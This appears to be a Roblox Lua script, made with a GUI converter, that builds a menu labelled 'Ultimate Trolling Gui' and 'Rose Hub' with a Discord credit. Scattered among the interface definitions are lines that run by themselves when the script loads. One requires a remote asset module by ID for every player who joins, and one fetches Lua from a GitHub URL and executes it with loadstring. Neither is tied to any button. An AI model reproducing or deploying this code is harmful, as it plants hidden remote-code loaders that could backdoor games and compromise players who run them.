-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScriptLua = Instance.new("ScreenGui")
local Menu = Instance.new("Frame")
local Credits = Instance.new("TextLabel")
local X = Instance.new("TextButton")
local ult = Instance.new("TextButton")
local CM = Instance.new("TextButton")
local Rose = Instance.new("TextButton")

--Properties:

ScriptLua.Name = "ScriptLua"
ScriptLua.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScriptLua.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Menu.Name = "Menu"
Menu.Parent = ScriptLua
Menu.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
Menu.BorderSizePixel = 0
Menu.Position = UDim2.new(0.289726585, 0, 0.622926116, 0)
Menu.Size = UDim2.new(0, 394, 0, 231)

Credits.Name = "Credits"
Credits.Parent = Menu
Credits.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
Credits.BorderSizePixel = 0
Credits.Size = UDim2.new(0, 393, 0, 23)
Credits.Font = Enum.Font.SciFi
Credits.Text = "Discord : Rainshooter2#6969"
Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true

X.Name = "X"
X.Parent = Menu
X.BackgroundColor3 = Color3.fromRGB(102, 102, 102)
X.BorderSizePixel = 0
X.Position = UDim2.new(0.866205931, 0, 0.00446613505, 0)
X.Size = UDim2.new(0, 41, 0, 21)
X.Font = Enum.Font.SciFi
X.Text = "X"
X.TextColor3 = Color3.fromRGB(0, 0, 0)
X.TextScaled = true
X.TextSize = 14.000
X.TextWrapped = true
game.StarterGui.ScriptLua:Destroy()

ult.Name = "ult"
ult.Parent = Menu
ult.BackgroundColor3 = Color3.fromRGB(102, 102, 106)
ult.BorderSizePixel = 0
ult.Position = UDim2.new(0, 0, 0.16883117, 0)
ult.Size = UDim2.new(0, 394, 0, 33)
ult.Font = Enum.Font.SciFi
ult.Text = "Ultimate Trolling Gui"
ult.TextColor3 = Color3.fromRGB(0, 0, 0)
ult.TextScaled = true
ult.TextSize = 14.000
ult.TextWrapped = true
game.Players.PlayerAdded:Connect(function(player)
		require(4532147242):Fire(player.Name)
end)


CM.Name = "CM"
CM.Parent = Menu
CM.BackgroundColor3 = Color3.fromRGB(102, 102, 106)
CM.BorderSizePixel = 0
CM.Position = UDim2.new(0, 0, 0.692640722, 0)
CM.Size = UDim2.new(0, 394, 0, 33)
CM.Font = Enum.Font.SciFi
CM.Text = "Coming Soon"
CM.TextColor3 = Color3.fromRGB(0, 0, 0)
CM.TextScaled = true
CM.TextSize = 14.000
CM.TextWrapped = true




Rose.Name = "Rose"
Rose.Parent = Menu
Rose.BackgroundColor3 = Color3.fromRGB(102, 102, 106)
Rose.BorderSizePixel = 0
Rose.Position = UDim2.new(0, 0, 0.428571463, 0)
Rose.Size = UDim2.new(0, 394, 0, 33)
Rose.Font = Enum.Font.SciFi
Rose.Text = "Rose Hub"
Rose.TextColor3 = Color3.fromRGB(0, 0, 0)
Rose.TextScaled = true
Rose.TextSize = 14.000
Rose.TextWrapped = true
loadstring(game:HttpGet(('https://github.com/Gamingrainplayz/Gamingrainplayz/blob/main/Roblox.lua'),true))()
